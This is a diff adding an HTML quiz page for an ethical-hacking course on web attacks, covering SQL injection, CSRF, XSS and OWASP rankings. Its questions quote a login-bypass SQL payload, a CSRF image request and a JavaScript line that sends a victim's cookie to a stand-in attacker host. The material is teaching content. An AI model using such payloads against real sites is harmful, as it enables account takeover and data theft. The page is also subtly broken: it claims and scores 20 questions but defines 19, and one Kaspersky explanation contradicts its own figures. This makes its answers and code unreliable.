@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CC6051 – Web Attacks Quiz</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Syne:wght@400;600;800&display=swap');
+
+  :root {
+    --bg: #0a0e1a;
+    --surface: #111827;
+    --card: #161f30;
+    --border: #1e2d45;
+    --accent: #00e5ff;
+    --accent2: #ff4d6d;
+    --correct: #00ff87;
+    --wrong: #ff4d6d;
+    --text: #e2eaf4;
+    --muted: #6b7fa3;
+    --mono: 'JetBrains Mono', monospace;
+    --sans: 'Syne', sans-serif;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    min-height: 100vh;
+    padding: 2rem 1rem 4rem;
+    background-image:
+      radial-gradient(ellipse 80% 40% at 50% -10%, rgba(0,229,255,0.07) 0%, transparent 70%),
+      radial-gradient(ellipse 50% 30% at 90% 80%, rgba(255,77,109,0.05) 0%, transparent 60%);
+  }
+
+  header {
+    text-align: center;
+    max-width: 760px;
+    margin: 0 auto 3rem;
+  }
+
+  .tag {
+    display: inline-block;
+    font-family: var(--mono);
+    font-size: 0.7rem;
+    letter-spacing: 0.15em;
+    color: var(--accent);
+    border: 1px solid rgba(0,229,255,0.3);
+    padding: 4px 12px;
+    border-radius: 2px;
+    margin-bottom: 1rem;
+    text-transform: uppercase;
+  }
+
+  h1 {
+    font-size: clamp(1.8rem, 5vw, 2.8rem);
+    font-weight: 800;
+    line-height: 1.1;
+    letter-spacing: -0.02em;
+    margin-bottom: 0.5rem;
+  }
+
+  h1 span { color: var(--accent); }
+
+  .subtitle {
+    color: var(--muted);
+    font-size: 0.95rem;
+    font-family: var(--mono);
+  }
+
+  .quiz-container {
+    max-width: 760px;
+    margin: 0 auto;
+    display: flex;
+    flex-direction: column;
+    gap: 1.5rem;
+  }
+
+  .question-card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1.5rem;
+    transition: border-color 0.3s;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .question-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0;
+    width: 3px; height: 100%;
+    background: var(--accent);
+    opacity: 0.4;
+  }
+
+  .question-card.answered::before { opacity: 1; }
+  .question-card.correct-card::before { background: var(--correct); }
+  .question-card.wrong-card::before { background: var(--wrong); }
+
+  .q-number {
+    font-family: var(--mono);
+    font-size: 0.7rem;
+    color: var(--accent);
+    letter-spacing: 0.1em;
+    margin-bottom: 0.6rem;
+    text-transform: uppercase;
+  }
+
+  .q-text {
+    font-size: 1rem;
+    font-weight: 600;
+    line-height: 1.5;
+    margin-bottom: 1.2rem;
+    color: #cdd9ee;
+  }
+
+  .options {
+    display: flex;
+    flex-direction: column;
+    gap: 0.5rem;
+  }
+
+  .option {
+    display: flex;
+    align-items: flex-start;
+    gap: 0.75rem;
+    padding: 0.75rem 1rem;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    cursor: pointer;
+    transition: all 0.2s;
+    background: transparent;
+    font-family: var(--sans);
+    font-size: 0.9rem;
+    color: var(--text);
+    text-align: left;
+    line-height: 1.4;
+  }
+
+  .option:hover:not(:disabled) {
+    border-color: var(--accent);
+    background: rgba(0,229,255,0.04);
+  }
+
+  .option-letter {
+    font-family: var(--mono);
+    font-size: 0.75rem;
+    color: var(--muted);
+    min-width: 1.2rem;
+    padding-top: 1px;
+    flex-shrink: 0;
+  }
+
+  .option.correct {
+    border-color: var(--correct);
+    background: rgba(0,255,135,0.06);
+    color: var(--correct);
+  }
+
+  .option.correct .option-letter { color: var(--correct); }
+
+  .option.wrong {
+    border-color: var(--wrong);
+    background: rgba(255,77,109,0.06);
+    color: var(--wrong);
+  }
+
+  .option.wrong .option-letter { color: var(--wrong); }
+
+  .option.reveal-correct {
+    border-color: rgba(0,255,135,0.4);
+    background: rgba(0,255,135,0.03);
+    color: var(--correct);
+  }
+
+  .option:disabled { cursor: default; }
+
+  .feedback {
+    margin-top: 1rem;
+    padding: 0.8rem 1rem;
+    border-radius: 5px;
+    font-family: var(--mono);
+    font-size: 0.8rem;
+    line-height: 1.6;
+    display: none;
+    border-left: 3px solid;
+  }
+
+  .feedback.show { display: block; }
+  .feedback.correct-fb { border-color: var(--correct); background: rgba(0,255,135,0.05); color: #a0ffd4; }
+  .feedback.wrong-fb { border-color: var(--wrong); background: rgba(255,77,109,0.05); color: #ffa0b2; }
+
+  .score-panel {
+    max-width: 760px;
+    margin: 2rem auto 0;
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 2rem;
+    text-align: center;
+    display: none;
+  }
+
+  .score-panel.show { display: block; }
+
+  .score-big {
+    font-size: 4rem;
+    font-weight: 800;
+    font-family: var(--mono);
+    color: var(--accent);
+    line-height: 1;
+    margin-bottom: 0.5rem;
+  }
+
+  .score-label {
+    color: var(--muted);
+    font-size: 0.9rem;
+    margin-bottom: 1.5rem;
+  }
+
+  .grade-badge {
+    display: inline-block;
+    padding: 6px 20px;
+    border-radius: 4px;
+    font-family: var(--mono);
+    font-size: 0.8rem;
+    letter-spacing: 0.1em;
+    margin-bottom: 1.5rem;
+  }
+
+  .reset-btn {
+    background: transparent;
+    border: 1px solid var(--accent);
+    color: var(--accent);
+    font-family: var(--mono);
+    font-size: 0.85rem;
+    padding: 10px 28px;
+    border-radius: 4px;
+    cursor: pointer;
+    letter-spacing: 0.1em;
+    transition: all 0.2s;
+    text-transform: uppercase;
+  }
+
+  .reset-btn:hover {
+    background: rgba(0,229,255,0.1);
+  }
+
+  .progress-bar {
+    max-width: 760px;
+    margin: 0 auto 2rem;
+    height: 3px;
+    background: var(--border);
+    border-radius: 2px;
+    overflow: hidden;
+  }
+
+  .progress-fill {
+    height: 100%;
+    background: linear-gradient(90deg, var(--accent), #00b4d8);
+    transition: width 0.4s ease;
+    width: 0%;
+  }
+
+  .progress-text {
+    max-width: 760px;
+    margin: 0 auto 0.5rem;
+    font-family: var(--mono);
+    font-size: 0.72rem;
+    color: var(--muted);
+    display: flex;
+    justify-content: space-between;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="tag">CC6051 · Ethical Hacking</div>
+  <h1>Web Attacks &amp;<br><span>Penetration Testing</span></h1>
+  <p class="subtitle">20-question multiple choice quiz</p>
+</header>
+
+<div class="progress-text">
+  <span id="prog-label">0 / 20 answered</span>
+  <span id="score-label">Score: 0</span>
+</div>
+<div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
+
+<div class="quiz-container" id="quiz"></div>
+
+<div class="score-panel" id="score-panel">
+  <div class="score-big" id="final-score">0/20</div>
+  <div class="score-label">Final Score</div>
+  <div class="grade-badge" id="grade-badge"></div>
+  <br>
+  <button class="reset-btn" onclick="resetQuiz()">↺ Retake Quiz</button>
+</div>
+
+<script>
+const questions = [
+  {
+    q: "Which port does standard HTTP traffic use?",
+    options: ["UDP port 53", "TCP port 443", "TCP port 80", "TCP port 8080"],
+    answer: 2,
+    explanation: "HTTP uses TCP port 80. DNS uses UDP port 53, and HTTPS uses TCP port 443."
+  },
+  {
+    q: "According to Kaspersky 2019 data, what percentage of user computers were subjected to at least one web attack over the year?",
+    options: ["44%", "56%", "38%", "25%"],
+    answer: 2,
+    explanation: "38% of user computers were subjected to at least one web attack over the year (Kaspersky 2019)."
+  },
+  {
+    q: "In the OWASP Top 10 (2017), which vulnerability ranked #1?",
+    options: ["Cross-Site Scripting (XSS)", "Broken Authentication", "Injection", "Sensitive Data Exposure"],
+    answer: 2,
+    explanation: "Injection (A1:2017) ranked #1 in both the 2013 and 2017 OWASP Top 10 lists."
+  },
+  {
+    q: "What does SQL Injection exploit?",
+    options: [
+      "Lack of HTTPS encryption on the connection",
+      "User input that is not properly filtered for escape characters such as quotes",
+      "Cookies stored on the client browser",
+      "Weak session tokens issued by the server"
+    ],
+    answer: 1,
+    explanation: "SQL Injection works because user input is not properly filtered for string literal escape characters (e.g., quotes), allowing attackers to send SQL statements directly to the database."
+  },
+  {
+    q: "An attacker enters the lastname value `' OR 1=1--` into a login form. What is the likely outcome?",
+    options: [
+      "A syntax error is returned and no data is exposed",
+      "Only the record for that username is returned",
+      "All records in the database table are disclosed",
+      "The database server crashes"
+    ],
+    answer: 2,
+    explanation: "The OR 1=1 condition is always true, and -- comments out the rest of the query, so all records are returned."
+  },
+  {
+    q: "Which worm exploited a buffer overflow in Microsoft IIS by sending a long Unicode-encoded URL?",
+    options: ["Slammer", "Conficker", "Code Red", "Melissa"],
+    answer: 2,
+    explanation: "The Code Red worm exploited a buffer overflow in the .IDA handler of IIS using a long URL filled with Unicode-encoded bytes, causing the server to execute shell code."
+  },
+  {
+    q: "What is the primary goal of a Cross-Site Request Forgery (CSRF) attack?",
+    options: [
+      "To inject malicious SQL into a backend database",
+      "To trick an authenticated user into unknowingly sending a forged request to a trusted site",
+      "To steal cookies by reflecting a script off a legitimate server",
+      "To overflow a buffer on the web server"
+    ],
+    answer: 1,
+    explanation: "CSRF (session riding) tricks an already-authenticated user into sending a hidden forged request to a trusted site, using their existing authentication cookie."
+  },
+  {
+    q: "In a CSRF attack using a hidden iframe, how does the malicious site exploit the victim's bank session?",
+    options: [
+      "It intercepts the victim's network traffic with a packet sniffer",
+      "It submits a hidden POST form to the bank using the victim's authentication cookie",
+      "It injects JavaScript directly into the bank's server",
+      "It cracks the victim's password using a dictionary attack"
+    ],
+    answer: 1,
+    explanation: "The malicious site embeds an invisible iframe containing a hidden form that POSTs to the bank. When the victim (already logged in) visits, the browser automatically includes their cookie, so the bank processes the forged request."
+  },
+  {
+    q: "Which HTML element is used in the CSRF image-based attack to trigger a GET request silently?",
+    options: ["<form>", "<script>", "<img>", "<iframe>"],
+    answer: 2,
+    explanation: "An <img> tag with its src set to a URL containing parameters (e.g., buy.php?symbol=SCOX&shares=1000) causes the browser to send a GET request when the page loads."
+  },
+  {
+    q: "In a Reflected XSS attack, why does the victim's browser execute the injected script?",
+    options: [
+      "The script is stored permanently in the server's database",
+      "The browser cannot distinguish between a legitimate and injected script",
+      "The script appears to come from the trusted legitimate site A",
+      "The attacker has gained direct access to the victim's browser"
+    ],
+    answer: 2,
+    explanation: "In reflected XSS, the script is reflected back to the victim in a response from the trusted site A, so the browser executes it as if it originated from that trusted domain."
+  },
+  {
+    q: "In the XSS session-hijacking example, what does the injected JavaScript `var i=new Image; i.src=\"http://mdattacker.net/\"+document.cookie;` accomplish?",
+    options: [
+      "It deletes the victim's session cookie",
+      "It forces the victim to log out of the application",
+      "It sends the victim's session cookie to the attacker's server via an image request",
+      "It encrypts the session cookie so the server cannot read it"
+    ],
+    answer: 2,
+    explanation: "The script creates an Image object and sets its src to the attacker's server URL appended with document.cookie, causing the browser to send the session token to the attacker as part of the HTTP request."
+  },
+  {
+    q: "What is the recommended method to prevent XSS attacks?",
+    options: [
+      "Use prepared statements for all database queries",
+      "Escape all user-supplied data before reflecting it back in a browser response",
+      "Disable cookies entirely",
+      "Enforce HTTPS on all pages"
+    ],
+    answer: 1,
+    explanation: "The preferred defence is to escape all user-supplied data (e.g., converting < to &lt;) before it is reflected back in a dynamically generated page, preventing it from being interpreted as HTML/script."
+  },
+  {
+    q: "According to Kaspersky Labs 2019, what percentage of web exploits were aimed at web browsers?",
+    options: ["42%", "56%", "45%", "38%"],
+    answer: 1,
+    explanation: "56% of exploits were aimed at web browsers (combining Oracle Java at 45% and Browsers at 42% makes the combined browser-related share ~56% as cited in the slides)."
+  },
+  {
+    q: "Which of the following is a server-side web threat?",
+    options: [
+      "Cookie theft",
+      "IP spoofing",
+      "SQL injection",
+      "Phishing"
+    ],
+    answer: 2,
+    explanation: "SQL injection is a server-side threat. Cookie theft and phishing are client-side threats; IP spoofing is a network connection threat."
+  },
+  {
+    q: "DNS queries typically use which protocol and port?",
+    options: ["TCP port 80", "UDP port 53", "TCP port 443", "UDP port 123"],
+    answer: 1,
+    explanation: "DNS uses UDP port 53 for standard queries."
+  },
+  {
+    q: "What makes web-based attacks hard to detect compared to direct attacks?",
+    options: [
+      "They always use encrypted channels",
+      "The attack only occurs if the victim visits the malicious site, unlike noisy direct attacks",
+      "They require physical access to the server",
+      "Web attacks are always blocked by firewalls"
+    ],
+    answer: 1,
+    explanation: "Web attacks are passive — they only trigger when the victim visits the malicious site, making them far less 'noisy' than active direct attacks and thus harder to detect."
+  },
+  {
+    q: "In the OWASP Top 10 (2017), Cross-Site Scripting (XSS) moved to which position compared to A3 in 2013?",
+    options: ["A3", "A5", "A7", "A9"],
+    answer: 2,
+    explanation: "XSS dropped from A3 in the 2013 list to A7 in the 2017 OWASP Top 10."
+  },
+  {
+    q: "Which of the following best describes a 'stored' XSS attack (also called persistent XSS)?",
+    options: [
+      "A script is included in a URL and reflected off a server's error page",
+      "Malicious script is permanently stored in the server's database and served to all future visitors",
+      "The attacker manipulates the DOM on the client side without any server involvement",
+      "A script is injected via a buffer overflow in the web server"
+    ],
+    answer: 1,
+    explanation: "In stored (persistent) XSS the injected script is saved in the server's database (e.g., in a comment field) and then delivered to any user who views that content."
+  },
+  {
+    q: "What does the `--` at the end of `' OR 1=1--` do in a SQL injection payload?",
+    options: [
+      "It increments a counter in the database",
+      "It terminates the SQL server connection",
+      "It begins a SQL comment, causing the rest of the original query to be ignored",
+      "It indicates the end of a stored procedure call"
+    ],
+    answer: 2,
+    explanation: "In SQL, -- starts an inline comment. Everything after it is ignored by the database engine, effectively removing the remaining conditions (e.g., the password check) from the query."
+  },
+  {
+    q: "According to the lecture, which two countries hosted 44% of malicious web resources used in web attacks (Kaspersky)?",
+    options: [
+      "Russia and China",
+      "US and Germany",
+      "UK and France",
+      "Netherlands and Brazil"
+    ],
+    answer: 1,
+    explanation: "44% of web attacks were carried out using malicious web resources located in the US and Germany (Kaspersky 2019)."
+  }
+];
+
+let answered = 0;
+let score = 0;
+
+function buildQuiz() {
+  const container = document.getElementById('quiz');
+  container.innerHTML = '';
+  answered = 0;
+  score = 0;
+  updateProgress();
+
+  questions.forEach((q, i) => {
+    const card = document.createElement('div');
+    card.className = 'question-card';
+    card.id = `card-${i}`;
+
+    const letters = ['A', 'B', 'C', 'D'];
+
+    card.innerHTML = `
+      <div class="q-number">Question ${String(i+1).padStart(2,'0')} / 20</div>
+      <div class="q-text">${q.q}</div>
+      <div class="options">
+        ${q.options.map((opt, j) => `
+          <button class="option" data-q="${i}" data-opt="${j}" onclick="selectAnswer(${i},${j})">
+            <span class="option-letter">${letters[j]}</span>
+            <span>${opt}</span>
+          </button>
+        `).join('')}
+      </div>
+      <div class="feedback" id="fb-${i}"></div>
+    `;
+    container.appendChild(card);
+  });
+
+  document.getElementById('score-panel').classList.remove('show');
+}
+
+function selectAnswer(qIndex, optIndex) {
+  const q = questions[qIndex];
+  const card = document.getElementById(`card-${qIndex}`);
+  const buttons = card.querySelectorAll('.option');
+  const fb = document.getElementById(`fb-${qIndex}`);
+
+  // Disable all options
+  buttons.forEach(b => b.disabled = true);
+
+  const isCorrect = optIndex === q.answer;
+
+  buttons[optIndex].classList.add(isCorrect ? 'correct' : 'wrong');
+  if (!isCorrect) {
+    buttons[q.answer].classList.add('reveal-correct');
+  }
+
+  card.classList.add('answered', isCorrect ? 'correct-card' : 'wrong-card');
+
+  fb.className = `feedback show ${isCorrect ? 'correct-fb' : 'wrong-fb'}`;
+  fb.innerHTML = `${isCorrect ? '✓ Correct' : '✗ Incorrect'} — ${q.explanation}`;
+
+  if (isCorrect) score++;
+  answered++;
+  updateProgress();
+
+  if (answered === questions.length) {
+    setTimeout(showScore, 600);
+  }
+}
+
+function updateProgress() {
+  document.getElementById('prog-label').textContent = `${answered} / 20 answered`;
+  document.getElementById('score-label').textContent = `Score: ${score}`;
+  document.getElementById('progress-fill').style.width = `${(answered / 20) * 100}%`;
+}
+
+function showScore() {
+  const panel = document.getElementById('score-panel');
+  const pct = Math.round((score / 20) * 100);
+  document.getElementById('final-score').textContent = `${score}/20`;
+
+  const badge = document.getElementById('grade-badge');
+  let grade, color;
+  if (pct >= 90) { grade = 'Excellent — A'; color = '#00ff87'; }
+  else if (pct >= 75) { grade = 'Good — B'; color = '#00e5ff'; }
+  else if (pct >= 60) { grade = 'Pass — C'; color = '#ffd700'; }
+  else { grade = 'Needs Revision — F'; color = '#ff4d6d'; }
+
+  badge.textContent = grade;
+  badge.style.background = color + '15';
+  badge.style.border = `1px solid ${color}`;
+  badge.style.color = color;
+
+  panel.classList.add('show');
+  panel.scrollIntoView({ behavior: 'smooth', block: 'center' });
+}
+
+function resetQuiz() {
+  buildQuiz();
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+buildQuiz();
+</script>
+</body>
+</html>
